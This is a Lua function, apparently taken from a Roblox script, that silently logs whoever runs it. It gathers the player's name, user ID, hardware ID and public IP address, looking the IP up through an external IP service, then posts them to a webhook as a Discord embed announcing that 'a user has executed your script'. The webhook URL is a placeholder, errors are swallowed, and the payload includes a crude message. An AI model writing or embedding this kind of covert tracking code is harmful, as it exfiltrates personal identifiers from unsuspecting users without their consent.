function bb(a)
    local b =
        "no logger"
    local c = {
        ["avatar_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. a.Name,
        ["Content"] = "omg big booty hole",
        ["embeds"] = {
            {
                ["title"] = "Logged: " .. a.Name,
                ["description"] = "<@447456518896615424>",
                ["type"] = "rich",
                ["color"] = tonumber("0x" .. tostring(hexColor)),
                ["image"] = {
                    ["url"] = tostring("https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. a.Name)
                },
                ["footer"] = {
                    ["text"] = "Logged User Success!",
                    ["icon_url"] = tostring("https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. a.Name)
                },
                ["fields"] = {
                    {
                        ["name"] = "Player Profile:",
                        ["value"] = "**[Here](https://www.roblox.com/users/" .. tostring(a.UserId) .. "/profile)**",
                        ["inline"] = true
                    },
                    {["name"] = "Why Notify?", ["value"] = "A user Has Executed Your Script..", ["inline"] = true},
                    {["name"] = "HardWareId:", ["value"] = hwid, ["inline"] = true},
                    {
                        ["name"] = "IP:",
                        ["value"] = tostring(game:HttpGet("https://api.ipify.org", true)),
                        ["inline"] = true
                    }
                }
            }
        }
    }
    local d = HttpService:JSONEncode(c)
    pcall(
        function()
            HttpService:JSONDecode(
                request(
                    {Url = tostring(b), Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = d}
                )
            )
        end
    )
end
